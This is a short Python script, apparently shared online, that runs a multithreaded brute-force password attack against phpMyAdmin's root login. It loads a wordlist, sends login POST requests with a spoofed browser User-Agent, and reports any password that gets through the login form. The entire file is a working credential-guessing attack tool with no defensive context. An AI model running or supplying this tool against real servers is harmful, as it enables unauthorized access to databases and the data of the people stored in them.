#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# from IcySun
# 脚本功能：暴力破解phpMyadmin密码 
 
from queue import Queue
import threading,sys
import requests
 
def use():
    print(sys.argv)
    print('#' * 50)
    print('\t Crack Phpmyadmin root\'s pass')
    print('\t ./crackPhpmyadmin.py url worldlists  \n\t    (default user is root)')
 
 
    print('#' * 50)
 
def crack(password):
    global url
    payload = {'pma_username': 'root', 'pma_password': password}
    headers = {'User-Agent' : 'Mozilla/5.0 (Windows NT 6.1; WOW64)'}
    r = requests.post(url, headers = headers, data = payload)
    if 'name="login_form"' not in r.text:
        print(' OK! Have Got The Pass ==> %s' % password)
 
class MyThread(threading.Thread):
    def __init__(self,action):
        threading.Thread.__init__(self)
        self.action=action
    def run(self):
        global queue,passlist
        if self.action == "put":
            #添加密码
            pw=passlist.readline()
            while pw:
                pass
                pw=passlist.readline()
                queue.put(pw.strip())
        else:
            #获取密码
            while not queue.empty():
                password = queue.get()
                crack(password)
 
def main():
    global url,queue,passlist
    queue = Queue()
    url = sys.argv[1]
    worldlists=sys.argv[2]
    passlist = open(worldlists,'r')

    for i in range(100):
        r=MyThread("put")
        r.start()
 
    for i in range(10):
        c = MyThread("get")
        c.start()
 
if __name__ == '__main__':
    if len(sys.argv) != 3 :
        use()
    else:
        main()